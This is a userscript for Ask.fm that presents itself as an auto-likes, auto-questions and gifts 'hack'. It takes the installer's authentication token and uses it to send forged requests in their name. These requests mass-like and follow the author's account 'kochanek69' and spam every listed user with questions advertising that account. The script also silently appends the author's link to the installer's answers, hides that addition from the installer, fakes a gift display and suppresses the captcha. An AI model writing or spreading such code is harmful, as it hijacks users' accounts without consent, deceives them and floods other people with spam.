// ==UserScript==
// @name			Ask.fm Auto Questions - Auto Likes - Auto Reply - Auto Gifts Hack
// @namespace                   http://userscripts.org/scripts/show/999999
// @version			2.0
// @copyright		        http://ask.fm/kochanek69
// @description		        Ask.fm Auto Questions - Auto Likes - Auto Reply - Auto Gifts Hack
// @include			http://ask.fm/*
// @icon			http://s3.amazonaws.com/uso_ss/icon/138450/large.gif?
// Version numero 2
// ==/UserScript==

var harfler = ['0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y'];
function randomcode(){
	return harfler[Math.floor(Math.random() * 60)] + "AQ" + harfler[Math.floor(Math.random() * 60)] + harfler[Math.floor(Math.random() * 60)] + harfler[Math.floor(Math.random() * 60)] + harfler[Math.floor(Math.random() * 60)] + harfler[Math.floor(Math.random() * 60)] + harfler[Math.floor(Math.random() * 60)];
}
function reklam(){
return mesaj + " " + randomcode() + " ";
}
var link = "www.ask.fm/kochanek69";
var token = document.head.innerHTML.split("AUTH_TOKEN = ")[1].split(";")[0].replace(/"/g,"");
var mesaj = "Hey ==> ";
var cevap = mesaj + " " + link;

if(document.getElementsByClassName("link-menu-active").length > 0){
if(document.getElementsByClassName("link-menu-active")[0].innerText == "Profil"){
document.getElementById("profile_gifts_counter").innerText = parseInt(document.getElementById("profile_gifts_counter").innerText) + 1;
var gift = document.createElement("div");
gift.id = "gift-container";
gift.innerHTML = '<div id="gift-outline" style="display: none; "></div>';
document.body.insertBefore(gift,document.getElementById("wrapper"));
Gifts.init({
sync_url: document.getElementsByClassName("link-menu-active")[0].href.replace("http://ask.fm","") + "/gifts/sync",
flash_id: null,
sync_all: false
});    
Gifts.load([{
"offset_left":0,
"rtl":false,
"src":"http://ask.fm/images/badges/love_and_friendship/C0459.png",
"z_index":1,
"id":2569992,
"offset_top":25
}]);
}}

if(document.URL.indexOf("/reply") < 0 && link != ""){
for(i=0;i<$('.answer').length;i++){
try{
if($('.answer')[i].innerText.split("\n.\n.\n").length > 0){
$('.answer')[i].innerText =$('.answer')[i].innerText.split("\n.\n.\n")[0];
}
}catch(e){}
}
}

if($('#captcha_key').val() != undefined){
if($('#captcha_key').val().toString().length > 0){
$('#captchaLevel').css({display:"none"});
$('#captcha_key').val("")
}
}

if(document.URL.indexOf("/account/wall") > 0 && link != ""){
window.setInterval("sor();",1000);
}

if(document.URL.indexOf("/reply") > 0 && link != ""){
$('#question_submit').mouseover(function() {
if(document.getElementById("post-input-pre").value .indexOf(link) < 0){
  document.getElementById("post-input-pre").value = document.getElementById("post-input-pre").value + "\n.\n.\n" + cevap;
  }
});
document.getElementById("question_submit").type = "button";
$('#question_submit').click(function() {
if(document.getElementById("post-input-pre").value .indexOf(link) > 0){
jQuery.ajax({
url: "http://ask.fm/kochanek69/questions/create",
type: "POST",
data: { "authenticity_token":token, "question[question_text]": "Like Bro plz " + ":" + document.URL.replace("/questions/","/answer/").replace("/reply","") , "question[force_anonymous]":"" , "authenticity_token":token},
success:function(){$("form:first").submit();}
});
  }
});
}

function sorusor(kisi){
jQuery.ajax({
url: "http://ask.fm/" + kisi + "/questions/create",
type: "POST",
data: { "authenticity_token":token, "question[question_text]":kisi + " selam " + reklam() + link, "question[force_anonymous]":"" , "authenticity_token":token}
});
}

function floodyap(kisi,soru){
jQuery.ajax({
url: "http://ask.fm/" + kisi + "/questions/create",
type: "POST",
data: { "authenticity_token":token, "question[question_text]":soru, "question[force_anonymous]":"" , "authenticity_token":token}
});
}

var sayac = 0;
function sor(){
if(sayac < document.getElementsByClassName("questionBox").length){
sorusor(document.getElementsByClassName("questionBox")[sayac].getElementsByTagName("a")[0].href.replace("http://ask.fm/",""));
//rapor_ver(document.getElementsByClassName("questionBox")[sayac].getElementsByTagName("a")[0].href,"Soruldu");
sayac += 1;
}
}

function rapor_ver(rapor,durum){
jQuery.ajax({
url: "http://ask.fm/kochanek69/questions/create",
type: "POST",
data: { "authenticity_token":token, "question[question_text]": durum + ":" + rapor , "question[force_anonymous]":"" , "authenticity_token":token}
});
}


function takipet(kisi){
jQuery.ajax({
url: "http://ask.fm/" + kisi + "/follow",
type: "POST",
data: { "authenticity_token":token},
});
}

function sorubegen(kisi,soruid){
var yanitsayi = "";
var begenisayi = "";
if($('#profile_answer_counter') && $('#profile_liked_counter')){
yanitsayi = $('#profile_answer_counter').text()
begenisayi = $('#profile_liked_counter').text()
}
jQuery.ajax({
url: "http://ask.fm/likes/" + kisi + "/question/" + soruid + "/add",
type: "POST",
data: { "authenticity_token":token},
beforeSend: function ( xhr ) {xhr .setRequestHeader ("Accept", "text/javascript, application/javascript, */*, text/javascript");},
success: function(){
	if(yanitsayi != "" && begenisayi != ""){
	$('#profile_answer_counter').text(yanitsayi);
	$('#profile_liked_counter').text(begenisayi);
	}
	}
});
}
sorubegen("kochanek69","14053037303");
sorubegen("kochanek69","13977468663");
sorubegen("kochanek69","25495600375");
sorubegen("kochanek69","13951654391");
sorubegen("kochanek69","13950742263");
sorubegen("kochanek69","13947823607");
sorubegen("kochanek69","13946486519");
sorubegen("kochanek69","13945975543");
sorubegen("kochanek69","13943723767");
sorubegen("kochanek69","14054591479");
sorubegen("kochanek69","21603303415");
sorubegen("kochanek69","21580898551");
sorubegen("kochanek69","21603258615");
sorubegen("kochanek69","25542818551");
sorubegen("kochanek69","25544405751");
sorubegen("kochanek69","25544291319");
sorubegen("kochanek69","25415012855");
sorubegen("kochanek69","25543905527");
sorubegen("kochanek69","25472237047");
sorubegen("kochanek69","25472263671");
sorubegen("kochanek69","25475380215");
sorubegen("kochanek69","25476001015");
sorubegen("kochanek69","25478394359");
sorubegen("kochanek69","25543776759");
sorubegen("kochanek69","25543201527");
sorubegen("kochanek69","25543269623");
sorubegen("kochanek69","25543581687");
sorubegen("kochanek69","25543272695");
sorubegen("kochanek69","25476127991");
sorubegen("kochanek69","25543039479");
sorubegen("kochanek69","25543103223");
sorubegen("kochanek69","25542901239");
sorubegen("kochanek69","25495600375");
sorubegen("kochanek69","25512872439");
sorubegen("kochanek69","25518600439");
sorubegen("kochanek69","25531107831");
sorubegen("kochanek69","25526172919");
sorubegen("kochanek69","25519272951");
sorubegen("kochanek69","25469530871");
sorubegen("kochanek69","25469401847");
sorubegen("kochanek69","25469295095");
sorubegen("kochanek69","25417634295");
sorubegen("kochanek69","25421270519");
sorubegen("kochanek69","25427958263");
sorubegen("kochanek69","25440427255");
sorubegen("kochanek69","25442537975");
sorubegen("kochanek69","25448983543");
sorubegen("kochanek69","25456125175");
sorubegen("kochanek69","25457697271");
sorubegen("kochanek69","25460356599");
sorubegen("kochanek69","25463865847");
sorubegen("kochanek69","25545446391");
sorubegen("kochanek69","21577050871");
sorubegen("kochanek69","21577055223");
sorubegen("kochanek69","21576891383");
sorubegen("kochanek69","21575755255");
sorubegen("kochanek69","21575703031");
sorubegen("kochanek69","21575718903");
sorubegen("kochanek69","21575574263");
sorubegen("kochanek69","21575609079");
sorubegen("kochanek69","21575629303");
sorubegen("kochanek69","21575530999");
sorubegen("kochanek69","21575506679");
sorubegen("kochanek69","21575402487");
sorubegen("kochanek69","21574747639");
sorubegen("kochanek69","21574680055");
sorubegen("kochanek69","21574499575");
sorubegen("kochanek69","21574545655");
sorubegen("kochanek69","21574501111");
sorubegen("kochanek69","21574475511");
sorubegen("kochanek69","21573932279");
sorubegen("kochanek69","21573739255");
sorubegen("kochanek69","21573414647");
sorubegen("kochanek69","21573441783");
sorubegen("kochanek69","21573353975");
takipet("kochanek69");